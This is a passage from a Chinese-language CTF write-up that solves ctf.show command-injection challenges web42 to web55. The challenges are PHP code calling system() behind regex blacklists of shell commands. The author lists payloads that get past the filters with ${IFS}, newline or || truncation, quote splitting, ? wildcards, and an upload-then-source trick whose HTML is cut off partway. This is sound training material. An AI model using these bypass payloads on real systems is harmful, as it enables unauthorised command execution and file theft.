src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678888044280-4977aed2-5019-4f9a-b9f3-7a5f88a08b5d.png" alt="image.png"><br>于是payload也就很容易得到了：<code>?c=tac flag.php;ls</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678888113737-36ea4c05-f999-4289-b19f-55a8710fc053.png" alt="image.png"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>当然直接使用<code>%0a</code>截断也可以，比如：<code>tac f*%0a</code></p><h2 id="从重定向到黑洞（-gt-dev-null-2-gt-amp-1）"><a href="#从重定向到黑洞（-gt-dev-null-2-gt-amp-1）" class="headerlink" title="从重定向到黑洞（&gt;/dev/null 2&gt;&amp;1）"></a>从重定向到黑洞（&gt;/dev/null 2&gt;&amp;1）</h2><blockquote><p><a href="https://www.cnblogs.com/kexianting/p/11630085.html">https://www.cnblogs.com/kexianting/p/11630085.html</a>（建议忘了看这个，写的很全）</p></blockquote><p>但是我们不能只知道这个东西是是黑洞，我们也要明白其中的原理。<br>容易看出，上面的语句应该是分成两段，前一段是：<code>&gt;/dev/null</code>后一段是：<code>2&gt;&amp;1</code><br>前者的含义是将输出结果定向到<code>&gt;/dev/null</code>，而这个地址表示的是linux的空设备，因此会将运行结果消灭。<br>而后者简单解释就是将正确和错误两个输出绑定到一起，都输出到同一个地方。（其中1指的是标准输出，2指的是错误输出，详细的看参考文章）。</p><h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了分号，不能用上一题的方法绕过了，但是可以使用<code>%0a</code>（回车）截断。<br>payload：<code>tac f*%0a</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679064061206-b7272e00-d5ee-46c4-bb3f-60feec9e1b6b.png" alt="image.png"></p><h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=tac f*%0a</code></p><h1 id="web45-IFS绕过原理解析"><a href="#web45-IFS绕过原理解析" class="headerlink" title="web45 IFS绕过原理解析"></a>web45 IFS绕过原理解析</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多了一个空格过滤，payload中简单加一个<code>$&#123;IFS&#125;</code>即可绕过。<br><code>?c=tac$&#123;IFS&#125;f*%0a</code></p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><blockquote><p><a href="https://blog.csdn.net/qq_54727981/article/details/125936528">https://blog.csdn.net/qq_54727981/article/details/125936528</a></p></blockquote><p>一直使用IFS来绕过，但是一直不知道什么意思，了解了一下：<br><em>$IFS 是一种 set 变量，当 shell 处理”命令替换”和”参数替换”时，shell 根据 IFS 的值，默认是 space,tab, newline 即空格，制表符，空行来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。<br>直接用$IFS的话，会认为解析没结束，会把后面的也当做参数解析，比如cat$IFSflag.php，会把IFSflag一起当变量解析。这时候需要在$IFS后面进行截断，使解析为空，结束 $IFS，正常执行后面的内容。</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$<span class="number">1</span>flag.php<span class="comment">//使用特殊变量</span></span><br><span class="line">cat$&#123;IFS&#125;flag.php<span class="comment">//使用&#123;&#125;</span></span><br><span class="line">cat<span class="variable">$IFS</span><span class="string">&#x27;f&#x27;</span>lag.php<span class="comment">//使用引号</span></span><br><span class="line">cat<span class="variable">$IFS</span>\flag.php<span class="comment">//使用转义符</span></span><br><span class="line">cat<span class="variable">$IFS</span>?lag.php<span class="comment">//使用通配符</span></span><br></pre></td></tr></table></figure><h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>空格过滤还过滤了美元符号，用通配符<code>&lt;</code>绕过即可。flag和*过滤用单双引号绕过即可。<br><code>?c=tac&lt;&gt;&#39;f&#39;lag.php%0a</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679066076057-af02fc4a-8fcb-4ffd-92d2-a0a618e12b51.png" alt="image.png"></p><h1 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=tac&lt;&#39;f&#39;lag.php%0a</code><br>hint中给的方法是这种：<code>nl&lt;fla&#39;&#39;g.php||</code><br>看来管道符也可以截断，但是尝试将管道符换成&amp;却不行。可能这里截断的是文本而不是命令。</p><h1 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>竟然还没有过滤tac<br><code>?c=tac&lt;&#39;f&#39;lag.php%0a</code></p><h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=tac&lt;f&#39;&#39;lag.php||</code>不让用%0a，就用刚刚在hint中学到的双管道符隔断。</p><h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=tac&lt;f&#39;&#39;lag.php||</code><br>过滤中出现了很有意思的东西：<code>\x09 和\x26</code>，\x表示后面两位用十六进制来表示，则前面两国的代表ascii码为9和26的字符<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679067645206-6016ee60-ecf7-444c-b21f-8aa772e86e2d.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679067671699-e7dac3c6-fcc4-4c21-abc4-ec77d4cec155.png" alt="image.png"><br>注意是十六进制，不是十进制。</p><h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这回把tac过滤了，但是还是有能用的，比如说nl<br><code>?c=nl&lt;&#39;f&#39;lag.php||</code>，php代码需要打开f12查看。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679068035543-96675332-0e1e-4049-a48b-92fc65af02f3.png" alt="image.png"></p><h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把通配符的&lt;&gt;过滤了，找了半天还有什么办法能够绕过空额过滤，看hint才发现又可以使用$了…<br><code>?c=nl$&#123;IFS&#125;fla&#39;&#39;g.php||</code></p><h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        echo($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        echo <span class="string">&quot;&lt;br&gt;&quot;</span>.$d;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        echo <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=nl$&#123;IFS&#125;fla&#39;&#39;g.php</code>但实际上前面过滤的字符也可以通过单引号引用绕过过滤，比如hint中的payload如下：<code>c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679585398882-ec3be4e8-ae77-465f-a040-def087976b2b.png" alt="image.png"></p><h1 id="web54-通配符中问号的使用"><a href="#web54-通配符中问号的使用" class="headerlink" title="web54 通配符中问号的使用"></a>web54 通配符中问号的使用</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一种方法：<code>mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</code>，因为没有禁用ls，因此知道文件名，因此可以使用mv来重命名文件。然后打开即可，打开有几种不同的方法，比如说<code>?c=uniq$&#123;IFS&#125;a.txt</code>，但是flag在源代码中，需要f12查看；或者用<code>?c=rev$&#123;IFS&#125;a.txt</code>反转输出文件，这种得到的flag是行反转的，需要调转回来：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679587103373-ae7c080f-73d5-4fb5-b617-0b10124e9840.png" alt="image.png"><br>除此之外，还有一种直接一步完成的方法。<code>c=uniq$&#123;IFS&#125;f???.php</code>，这里通过使用？通配符来一步绕过过滤，其实对名称的过滤大部分就是对linux通配符的考察，需要我们一点点加强功底。</p><h2 id="通配符？和-的区别"><a href="#通配符？和-的区别" class="headerlink" title="通配符？和*的区别"></a>通配符？和*的区别</h2><p>*可以替代一个或多个字符，而？只能替代一个字符。<br>比如：</p><ul><li>如果正在查找以AEW开头的一个文件，但不记得文件名其余部分，可以输入AEW*，查找以AEW开头的所有文件类型的文件，如AEWT.txt、AEWU.EXE、AEWI.dll等。</li><li>如果输入love?，查找以love开头的一个字符结尾文件类型的文件，如lovey、lovei等。要缩小范围可以输入love?.doc，查找以love开头的一个字符结尾文件类型并.doc为扩展名的文件如lovey.doc、loveh.doc。</li></ul><h1 id="web55-通配符中问号使用plus版"><a href="#web55-通配符中问号使用plus版" class="headerlink" title="web55 通配符中问号使用plus版"></a>web55 通配符中问号使用plus版</h1><blockquote><p><a href="https://blog.csdn.net/xiaolong22333/article/details/109480420?spm=a2c6h.12873639.article-detail.4.6ced5331lGc8cc">https://blog.csdn.net/xiaolong22333/article/details/109480420?spm=a2c6h.12873639.article-detail.4.6ced5331lGc8cc</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚看到这个题的第一想法是使用自增，但是发现吧分号过滤了，用不了。看了一下wp，发现了几种比较牛逼的解法。</p><h2 id="方法一-使用bin目录下的base64命令-来代替字符"><a href="#方法一-使用bin目录下的base64命令-来代替字符" class="headerlink" title="方法一 使用bin目录下的base64命令 ?来代替字符"></a>方法一 使用bin目录下的base64命令 ?来代替字符</h2><p>这里想使用的知识点是：<code>/bin/base64 flag.php</code><br>先介绍一下，在/bin目录下有若干个命令可以使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</span><br></pre></td></tr></table></figure><p>但是这里过滤了字符，不能直接用，因此我们可以借助通配符中的问号来完成payload。<br>即<code>/???/????64</code>因为没有过滤掉数字，所以可以通过64来找到base64命令。当然，文件名也是可以使用？表示的。<br>payload：<code>/???/????64 ????.???</code>后面这串代表的<code>flag.php</code>。将得到的字符串base64解密即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679811886497-dc470501-ef71-466c-b5cf-70e724650d0a.png" alt="image.png"><br>但是如何知道文件名是<code>flag.php</code>的这里并没有提到。</p><h2 id="方法二-使用bzip2下载文件-？来代替字符"><a href="#方法二-使用bzip2下载文件-？来代替字符" class="headerlink" title="方法二 使用bzip2下载文件 ？来代替字符"></a>方法二 使用bzip2下载文件 ？来代替字符</h2><p>除了<code>/bin</code>地址下，<code>/usr/bin</code>下也有执行命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等</span><br></pre></td></tr></table></figure><p>因此，我们也可以像方法一中选择具有数字的方法来使用，比如：<br><code>/usr/bin/bzip2 flag.php</code><br>修改为payload：<code>/???/???/????2 ????.???</code>，压缩之后，查询发现bzip2方法压缩的文件名称后缀为<code>.bz2</code><br>因此我们访问文件下载即可<code>/flag.php.bz2</code>，在本地解压打开即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679813512843-4296f544-86a6-4c74-a04e-ebd399b198ef.png" alt="image.png"></p><h2 id="方法三-“-”的妙用"><a href="#方法三-“-”的妙用" class="headerlink" title="方法三 “.”的妙用"></a>方法三 “.”的妙用</h2><blockquote><p><a href="https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html">https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html</a></p></blockquote><p>source命令，也就是.命令，可以通过<code>. file</code>来执行命令，因此这题我们可以通过post上传文件来执行命令。<br>当我们上传文件之后，文件会被保存在<code>/tmp</code>下，文件名称为随机构成的六个字符。因此可以使用<code>/???/??????</code>来匹配文件，但是临时文件有很多，这样没有办法精准地找到需要的文件。<br>这篇文章给出了解决方案：</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p></blockquote><p>在tmp临时文件中，只有php生成的文件是包含大写字母的，其余都是小写字母，因此我们可以加一个过滤大写字母的正则表达式，但是由于不一定一定会生成大写字母，因此需要多次尝试。<br>过滤出大写字母正常来说应该按照如下来写：<code>/???/????????[A-Z]</code>，但是这题里面过滤掉了字符，因此只能用A前面的字符和Z后面的字符（ASCII表），也就是：<code>/???/????????[@-[]</code>。<br>我们应该如何上传文件呢。<br>比较复杂的办法就是自己构造post内容写，比较简单的就是借助工具。<br>在本地写一个简单的html文件（将地址修改为目标地址）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://d3b49897-da81-47f9-8495-e017b7cf25e7.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span 